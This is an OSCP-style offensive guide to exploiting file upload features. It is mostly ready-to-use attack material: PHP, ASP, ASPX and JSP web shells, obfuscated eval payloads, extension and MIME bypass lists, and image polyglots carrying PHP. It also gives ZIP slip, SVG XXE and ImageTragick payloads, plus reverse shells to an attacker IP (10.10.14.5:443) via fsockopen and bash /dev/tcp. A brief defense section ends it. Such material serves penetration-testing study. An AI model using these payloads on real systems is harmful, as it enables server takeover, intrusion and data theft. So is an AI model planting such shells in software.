# File Upload Exploitation Guide

## Table of Contents
1. [File Upload Basics](#file-upload-basics)
2. [Detection & Enumeration](#detection--enumeration)
3. [Bypass Techniques](#bypass-techniques)
4. [Web Shells](#web-shells)
5. [Magic Bytes & Polyglots](#magic-bytes--polyglots)
6. [Advanced Exploitation](#advanced-exploitation)
7. [OSCP Scenarios](#oscp-scenarios)
8. [Defense Mechanisms](#defense-mechanisms)

---

## File Upload Basics

### What is File Upload Vulnerability?
Allows attackers to upload malicious files to a server, potentially leading to:
- **Remote Code Execution (RCE)**
- **Stored XSS**
- **Path Traversal**
- **Denial of Service**
- **Server-Side Request Forgery (SSRF)**

### Common Upload Mechanisms
- Web forms (profile pictures, document uploads)
- API endpoints (REST, GraphQL)
- File managers
- CMS systems (WordPress, Drupal)
- Email attachments (webmail)

---

## Detection & Enumeration

### Identifying Upload Functionality
```
Common endpoints:
/upload
/upload.php
/fileupload
/api/upload
/admin/upload
/user/avatar
/profile/picture
/documents/upload
```

### Testing for Restrictions
```bash
# 1. Check allowed extensions
curl -F "file=@test.php" http://target.com/upload.php
curl -F "file=@test.jpg" http://target.com/upload.php

# 2. Check file size limits
# Create large file
dd if=/dev/zero of=large.jpg bs=1M count=100

# 3. Check content-type filtering
curl -F "file=@shell.php" -H "Content-Type: image/jpeg" http://target.com/upload.php

# 4. Enumerate upload directory
gobuster dir -u http://target.com/uploads/ -w /usr/share/wordlists/dirb/common.txt
```

### Burp Suite Testing
```
1. Intercept upload request
2. Send to Repeater
3. Modify:
   - Filename
   - Content-Type
   - File content
   - Extension
4. Observe response
5. Check for uploaded file location
```

---

## Bypass Techniques

### 1. Extension Bypasses

#### Blacklist Bypass
```bash
# If .php is blacklisted, try:
shell.phtml
shell.php3
shell.php4
shell.php5
shell.php7
shell.phps
shell.pht
shell.phar
shell.phpt
shell.pgif
shell.phtml
shell.phtm
shell.inc
shell.hphp
shell.ctp

# Case variations
shell.Php
shell.PHp
shell.pHp
shell.PHP
shell.PhP

# Null byte injection (PHP < 5.3)
shell.php%00.jpg
shell.php\x00.jpg

# Double extensions
shell.jpg.php
shell.php.jpg

# Add trailing spaces/dots (Windows)
shell.php.
shell.php..
shell.php___
shell.php%20

# Alternative separators
shell.php::$DATA (Windows NTFS ADS)
shell.php:.jpg
```

#### Whitelist Bypass
```bash
# If only .jpg allowed:
shell.php.jpg
shell.jpg.php
shell.php%00.jpg

# Case manipulation
shell.JpG
shell.JPG

# Unicode bypass
shell.j\u0070g
```

### 2. Content-Type Bypass

#### Change MIME Type
```http
# Original request
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--

# Bypass: Change Content-Type to allowed type
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
```

### 3. Magic Bytes (File Signature) Bypass

#### Add Magic Bytes to PHP Shell
```php
# GIF89a magic bytes + PHP code
GIF89a
<?php system($_GET['cmd']); ?>

# PNG magic bytes
\x89PNG\r\n\x1a\n
<?php system($_GET['cmd']); ?>

# JPEG magic bytes
\xFF\xD8\xFF\xE0
<?php system($_GET['cmd']); ?>

# BMP magic bytes
BM
<?php system($_GET['cmd']); ?>
```

#### Create Polyglot File
```bash
# JPEG + PHP polyglot
echo -e '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00<?php system($_GET["cmd"]); ?>' > shell.php.jpg

# GIF + PHP
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.php.gif

# Using exiftool to embed PHP in image metadata
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.php.jpg
```

### 4. Path Traversal via Filename

#### Directory Traversal
```bash
# Upload to different directory
filename="../../../var/www/html/shell.php"
filename="..\..\..\..\inetpub\wwwroot\shell.php"

# URL encoding
filename="..%2F..%2F..%2Fvar%2Fwww%2Fhtml%2Fshell.php"

# Double encoding
filename="..%252F..%252F..%252Fshell.php"
```

### 5. Size Limit Bypass

#### Compress Payload
```bash
# Use gzip compression
gzip -9 shell.php

# Minimal web shell
<?=`$_GET[0]`?>  # 15 bytes

<?=`$_GET[x]`?>  # Shortest possible
```

### 6. Filter Evasion

#### Obfuscate PHP Code
```php
# Base64 encoding
<?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7')); ?>

# Hex encoding
<?php eval(hex2bin('73797374656d28245f4745545b27636d64275d293b')); ?>

# Rot13
<?php eval(str_rot13('flfgrz($_TRG["pzq"]);')); ?>

# Variable functions
<?php $a='system'; $a($_GET['cmd']); ?>

# String concatenation
<?php $a='sys'.'tem'; $a($_GET['cmd']); ?>

# Character code
<?php $a=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109); $a($_GET['cmd']); ?>
```

### 7. Race Condition

#### Exploiting Temporary Files
```bash
# Some apps upload to temp directory then validate
# Upload malicious file rapidly while accessing it

# Terminal 1: Upload loop
while true; do curl -F "file=@shell.php" http://target.com/upload.php; done

# Terminal 2: Access loop
while true; do curl http://target.com/uploads/shell.php?cmd=id; done
```

---

## Web Shells

### PHP Web Shells

#### Minimal PHP Shell
```php
<?php system($_GET['cmd']); ?>
```

#### Simple PHP Shell
```php
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

#### PHP Shell with Output
```php
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>
```

#### PHP Command Shell (Advanced)
```php
<?php
error_reporting(0);
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    echo "<pre>";
    $result = shell_exec($cmd);
    echo $result;
    echo "</pre>";
    die;
}
?>
```

#### PHP File Manager Shell
```php
<?php
if(isset($_GET['dir'])) {
    $dir = $_GET['dir'];
} else {
    $dir = getcwd();
}
echo "<h2>Directory: $dir</h2>";
echo "<pre>";
print_r(scandir($dir));
echo "</pre>";

if(isset($_GET['file'])) {
    echo "<h3>File: " . $_GET['file'] . "</h3>";
    echo "<pre>";
    echo htmlspecialchars(file_get_contents($_GET['file']));
    echo "</pre>";
}
?>
```

#### PHP Reverse Shell
```php
<?php
$ip = '10.10.14.5';
$port = 443;
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
```

### ASP/ASPX Web Shells

#### ASP Classic Shell
```asp
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objShell.exec(thecommand)
    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%>
<%= getCommandOutput(Request.QueryString("cmd")) %>
```

#### ASPX Shell
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e)
{
    if (Request.QueryString["cmd"] != null)
    {
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + Request.QueryString["cmd"];
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.Start();
        Response.Write("<pre>");
        Response.Write(p.StandardOutput.ReadToEnd());
        Response.Write("</pre>");
        p.WaitForExit();
    }
}
</script>
```

### JSP Web Shell
```jsp
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if(cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    InputStream in = p.getInputStream();
    BufferedReader reader = new BufferedReader(new InputStreamReader(in));
    String line;
    while((line = reader.readLine()) != null) {
        out.println(line + "<br>");
    }
}
%>
```

### One-Liners

#### PHP
```php
<?=`$_GET[0]`?>
<?=`$_POST[0]`?>
<?=system($_GET[0])?>
<?php eval($_POST[0]);?>
<? system($_GET['cmd']); ?>
```

#### ASP
```asp
<% eval request("cmd") %>
```

---

## Magic Bytes & Polyglots

### Common Magic Bytes (File Signatures)

```
Format      Magic Bytes (Hex)           ASCII
------      -----------------           -----
JPEG        FF D8 FF E0                 ÿØÿà
PNG         89 50 4E 47 0D 0A 1A 0A     .PNG....
GIF87a      47 49 46 38 37 61           GIF87a
GIF89a      47 49 46 38 39 61           GIF89a
BMP         42 4D                       BM
PDF         25 50 44 46                 %PDF
ZIP         50 4B 03 04                 PK..
RAR         52 61 72 21 1A 07           Rar!..
```

### Creating Polyglot Files

#### GIF + PHP Polyglot
```bash
# Method 1: Echo
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.php

# Method 2: Manual hex
printf '\x47\x49\x46\x38\x39\x61<?php system($_GET["cmd"]); ?>' > shell.php
```

#### JPEG + PHP Polyglot
```bash
# Method 1: Prepend magic bytes
echo -e '\xFF\xD8\xFF\xE0\x00\x10JFIF<?php system($_GET["cmd"]); ?>' > shell.php.jpg

# Method 2: Use existing image
cat image.jpg > shell.php.jpg
echo '<?php system($_GET["cmd"]); ?>' >> shell.php.jpg
```

#### PNG + PHP Polyglot
```bash
# Prepend PNG signature
printf '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>' > shell.php.png
```

#### Using Exiftool (Metadata Injection)
```bash
# Embed PHP in JPEG comment
exiftool -Comment='<?php system($_GET["cmd"]); ?>' input.jpg -o shell.php.jpg

# Embed PHP in PNG
exiftool -Copyright='<?php system($_GET["cmd"]); ?>' input.png -o shell.php.png

# View metadata
exiftool shell.php.jpg
```

### Accessing Polyglot Shells

#### Direct Access
```bash
# If server doesn't validate, direct access works
http://target.com/uploads/shell.php.jpg?cmd=whoami
```

#### Via LFI
```bash
# Include polyglot via LFI
http://target.com/index.php?page=uploads/shell.php.jpg&cmd=id
```

#### Via File Inclusion Bug
```bash
# Some apps process files based on parameter
http://target.com/view.php?file=uploads/shell.php.jpg&cmd=whoami
```

---

## Advanced Exploitation

### ZIP Upload Exploits

#### ZIP Slip (Path Traversal)
```python
#!/usr/bin/env python3
import zipfile

# Create malicious ZIP with path traversal
with zipfile.ZipFile('malicious.zip', 'w') as zf:
    # File will extract to ../../../../var/www/html/shell.php
    zf.writestr('../../../../var/www/html/shell.php', '<?php system($_GET["cmd"]); ?>')
```

#### Symlink ZIP
```bash
# Create symlink to sensitive file
ln -s /etc/passwd passwd.txt

# Zip the symlink
zip --symlinks malicious.zip passwd.txt

# Upload and extract - may read /etc/passwd
```

### XXE via File Upload

#### SVG with XXE
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

### ImageTragick (CVE-2016-3714)

#### Malicious Image File
```bash
# Create exploit file
cat > exploit.mvg << 'EOF'
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|ls -la")'
pop graphic-context
EOF

# Upload as image
mv exploit.mvg exploit.png
```

### Archive Bomb (DoS)

#### ZIP Bomb
```bash
# Create 42KB file that expands to 4.5PB
# Download pre-made: https://www.bamsoftware.com/hacks/zipbomb/
wget https://www.bamsoftware.com/hacks/zipbomb/zbxl.zip
```

### PDF Upload Exploits

#### PDF with Embedded JavaScript
```javascript
// Create PDF with JS (requires tools like pdftk)
// When opened, executes JavaScript
app.alert("XSS via PDF");
```

#### PDF with Embedded File
```bash
# Use tools to embed malicious executable in PDF
# Social engineering: "Extract and run attachment"
```

---

## OSCP Scenarios

### Scenario 1: Basic File Upload to RCE
```bash
# Step 1: Identify upload functionality
http://target.com/upload.php

# Step 2: Try basic PHP shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Step 3: Upload
curl -F "file=@shell.php" http://target.com/upload.php

# Step 4: Identify upload location (common paths)
http://target.com/uploads/shell.php
http://target.com/files/shell.php
http://target.com/images/shell.php

# Step 5: Execute commands
http://target.com/uploads/shell.php?cmd=whoami
http://target.com/uploads/shell.php?cmd=id

# Step 6: Get reverse shell
http://target.com/uploads/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'

# URL encode:
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.5%2F443%200%3E%261%27
```

### Scenario 2: Extension Filter Bypass
```bash
# Step 1: Upload blocked (.php rejected)
curl -F "file=@shell.php" http://target.com/upload.php
# Response: Only images allowed

# Step 2: Try alternative extensions
curl -F "file=@shell.phtml" http://target.com/upload.php
curl -F "file=@shell.php5" http://target.com/upload.php
curl -F "file=@shell.phar" http://target.com/upload.php

# Step 3: Access uploaded file
http://target.com/uploads/shell.phtml?cmd=id

# Step 4: Get shell
```

### Scenario 3: Polyglot Bypass
```bash
# Step 1: Create GIF polyglot
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.php.gif

# Step 2: Upload
curl -F "file=@shell.php.gif" http://target.com/upload.php

# Step 3: Find upload path
http://target.com/uploads/shell.php.gif

# Step 4: Include via LFI (if direct execution fails)
http://target.com/index.php?page=uploads/shell.php.gif&cmd=id
```

### Scenario 4: Content-Type Bypass
```bash
# Step 1: Intercept with Burp
# Upload shell.php

# Step 2: Modify Content-Type in Burp
POST /upload.php HTTP/1.1
...
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg    <-- Change this

<?php system($_GET['cmd']); ?>

# Step 3: Forward request
# Step 4: Access shell
```

### Scenario 5: Double Extension
```bash
# Step 1: Create file with double extension
echo '<?php system($_GET["cmd"]); ?>' > shell.jpg.php

# Or reversed (depends on server config)
echo '<?php system($_GET["cmd"]); ?>' > shell.php.jpg

# Step 2: Upload both variations
curl -F "file=@shell.jpg.php" http://target.com/upload.php
curl -F "file=@shell.php.jpg" http://target.com/upload.php

# Step 3: Test access
http://target.com/uploads/shell.jpg.php?cmd=id
http://target.com/uploads/shell.php.jpg?cmd=id
```

### Scenario 6: Upload + LFI Chain
```bash
# Step 1: Upload image with PHP payload
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > avatar.gif

# Step 2: Upload to profile picture
curl -F "avatar=@avatar.gif" http://target.com/profile/upload.php

# Step 3: Find upload path (check response or enumerate)
http://target.com/uploads/avatars/123.gif

# Step 4: Exploit LFI to include and execute
http://target.com/index.php?page=uploads/avatars/123.gif&cmd=whoami
```

---

## File Upload Testing Checklist

### Enumeration
- [ ] Identify all upload endpoints
- [ ] Check allowed file types (extensions)
- [ ] Test file size limits
- [ ] Identify upload directory
- [ ] Check if files are renamed
- [ ] Test for direct access to uploaded files

### Extension Testing
- [ ] Try blacklisted extensions (.php)
- [ ] Try alternative extensions (.phtml, .php5, .phar)
- [ ] Try double extensions (shell.php.jpg, shell.jpg.php)
- [ ] Try case variations (shell.Php, shell.PHP)
- [ ] Try null byte injection (shell.php%00.jpg)
- [ ] Try special chars (shell.php., shell.php___)

### Content-Type Testing
- [ ] Change Content-Type to allowed MIME type
- [ ] Test with incorrect Content-Type
- [ ] Try empty Content-Type

### Magic Bytes Testing
- [ ] Upload pure PHP shell
- [ ] Upload GIF + PHP polyglot
- [ ] Upload JPEG + PHP polyglot
- [ ] Upload PNG + PHP polyglot
- [ ] Test with exiftool metadata injection

### Bypass Testing
- [ ] Path traversal in filename
- [ ] Race condition exploitation
- [ ] ZIP slip vulnerability
- [ ] XXE via SVG/XML upload
- [ ] Archive bomb (DoS test - careful!)

### Post-Upload
- [ ] Direct access to uploaded file
- [ ] Include via LFI
- [ ] Execute via other vulnerabilities
- [ ] Check for stored XSS in filename/metadata

---

## Defense Mechanisms

### Secure File Upload (For Understanding)

#### Validation
```php
// 1. Whitelist extensions
$allowed = array('jpg', 'jpeg', 'png', 'gif');
$ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
if(!in_array(strtolower($ext), $allowed)) {
    die('Invalid file type');
}

// 2. Validate MIME type
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
$allowed_mimes = array('image/jpeg', 'image/png', 'image/gif');
if(!in_array($mime, $allowed_mimes)) {
    die('Invalid MIME type');
}

// 3. Check magic bytes
$file_content = file_get_contents($_FILES['file']['tmp_name']);
if(substr($file_content, 0, 6) !== 'GIF89a' &&
   substr($file_content, 0, 6) !== 'GIF87a' &&
   substr($file_content, 0, 4) !== "\xFF\xD8\xFF\xE0") {
    die('Invalid file signature');
}

// 4. Rename file
$new_name = bin2hex(random_bytes(16)) . '.' . $ext;

// 5. Store outside web root or with .htaccess deny
// 6. Set proper permissions (not executable)
chmod($upload_path . $new_name, 0644);
```

---

## Tools

### File Upload Testing Tools
```bash
# Fuxploider
git clone https://github.com/almandin/fuxploider
python3 fuxploider.py --url http://target.com/upload.php

# Upload Scanner (Burp Extension)
# Install via BApp Store in Burp Suite

# Manual with curl
curl -F "file=@shell.php" http://target.com/upload.php

# Manual with Burp Suite Repeater (best for OSCP)
```

### Web Shell Collections
```bash
# SecLists
/usr/share/seclists/Web-Shells/

# WebShells (laudanum)
/usr/share/webshells/

# Kali web shells
/usr/share/webshells/php/
/usr/share/webshells/asp/
/usr/share/webshells/aspx/
/usr/share/webshells/jsp/
```

---

## Quick Reference

### Quick Test Payloads

#### Minimal PHP Shell
```php
<?=`$_GET[0]`?>
```

#### GIF Polyglot
```bash
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.php.gif
```

#### Upload with curl
```bash
curl -F "file=@shell.php" http://target.com/upload.php
```

#### Alternative Extensions to Try
```
.phtml .php3 .php4 .php5 .php7 .phps .pht .phar
```

---

## OSCP Exam Tips

1. **Always test file upload** - very common in OSCP
2. **Start with simple .php shell** then bypass if blocked
3. **Use polyglots** (GIF89a + PHP) for image validation bypass
4. **Enumerate upload directory** - check common paths
5. **Combine with LFI** if direct execution fails
6. **Test alternative extensions** (.phtml, .php5, .phar)
7. **Burp Suite is your friend** - modify requests easily
8. **Document upload path** for report
9. **Keep shells minimal** to avoid AV detection
10. **Test immediately after upload** - some apps delete files

---

**Remember**: File upload vulnerabilities are critical and very common in OSCP. Master the bypass techniques and always test thoroughly!
